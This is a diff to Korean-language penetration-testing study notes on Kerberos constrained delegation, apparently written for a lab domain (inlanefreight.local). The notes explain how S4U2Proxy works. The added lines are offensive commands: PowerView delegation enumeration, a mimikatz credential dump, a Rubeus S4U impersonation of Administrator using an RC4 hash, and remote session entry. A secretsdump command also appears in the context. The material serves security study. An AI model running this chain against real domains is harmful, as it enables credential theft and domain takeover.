@@ -99,6 +99,20 @@ secretsdump.py -k -no-pass dc01.inlanefreight.local
 - 서비스(A)가 KDC에 User가 서비스(A)에 접근할 때 썼던 티켓을 그대로 `additional tickets`로 첨부 제출하면서, "이 티켓 속 유저(cname) 자격으로 서비스(B)용 새 ST를 발급해달라"고 요청하는 것(S4U2Proxy)
 - `cname-in-addl-tkt` 플래그를 통해 KDC는 서비스가 아니라 첨부 티켓 속 cname(User) 기준으로 발급 대상을 판단
 - 단, 서비스(A)의 `msDS-AllowedToDelegateTo` 속성에 서비스(B)가 명시되어 있어야만 발급 가능
+```powershell
+Import-Module .\PowerView.ps1
+
+Get-DomainComputer -TrustedToAuth
+```
+```powershell
+.\mimikatz.exe privilege::debug sekurlsa::msv exit
+```
+```powershell
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt
+```
+```powershell
+Enter-PSSession ws01.inlanefreight.local
+```
 
 ## Resource-Based Constrained Delegation
 - 위임 가능 여부를 자원을 가진 쪽(B)이 자기 객체 속성(msDS-AllowedToActOnBehalfOfOtherIdentity)에 "A를 신뢰한다"고 설정하는 방식,
